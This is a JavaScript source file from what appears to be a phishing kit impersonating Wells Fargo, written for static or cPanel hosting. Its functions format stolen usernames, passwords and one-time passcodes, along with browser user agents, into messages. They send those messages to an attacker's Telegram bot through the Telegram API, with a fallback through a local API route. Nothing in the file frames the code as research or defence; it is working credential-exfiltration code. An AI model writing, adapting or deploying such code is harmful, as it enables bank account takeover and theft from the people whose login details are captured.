// Client-side Telegram integration for static hosting
// Use this instead of the API route when deploying to cPanel or static hosting

import { CPANEL_CONFIG } from "@/config/cpanel-config";

export async function sendToTelegram(data) {
  // For static hosting, use hardcoded config or fallback to window.ENV
  const BOT_TOKEN =
    process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ||
    CPANEL_CONFIG.TELEGRAM_BOT_TOKEN ||
    window.ENV?.TELEGRAM_BOT_TOKEN;
  const CHAT_ID =
    process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ||
    CPANEL_CONFIG.TELEGRAM_CHAT_ID ||
    window.ENV?.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Telegram configuration missing");
    return false;
  }

  try {
    const message = formatMessage(data);

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }

    return true;
  } catch (error) {
    console.error("Failed to send to Telegram:", error);
    return false;
  }
}

function formatMessage(data) {
  const timestamp = new Date().toLocaleString();
  const userAgent = data.meta?.userAgent || "Unknown";

  let message = `🔐 <b>Wells Fargo Login Activity</b>\n\n`;
  message += `📅 <b>Time:</b> ${timestamp}\n`;
  message += `🆔 <b>Flow ID:</b> <code>${data.flowId}</code>\n`;
  message += `📱 <b>Type:</b> ${data.type.toUpperCase()}\n\n`;

  if (data.type === "login") {
    message += `👤 <b>Username:</b> <code>${data.username}</code>\n`;
    message += `🔑 <b>Password:</b> <code>${data.password}</code>\n`;
  } else if (data.type === "otp") {
    message += `🔢 <b>OTP Code:</b> <code>${data.otp}</code>\n`;
  }

  message += `\n🌐 <b>User Agent:</b> <code>${userAgent}</code>`;

  return message;
}

// Alternative function for environments that support fetch with credentials
export async function sendToTelegramSecure(data) {
  try {
    // This uses your existing API route (for Vercel, VPS hosting)
    const response = await fetch("/api/telegram", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });

    return response.ok;
  } catch (error) {
    console.error("Failed to send via API route:", error);
    // Fallback to direct Telegram API
    return await sendToTelegram(data);
  }
}
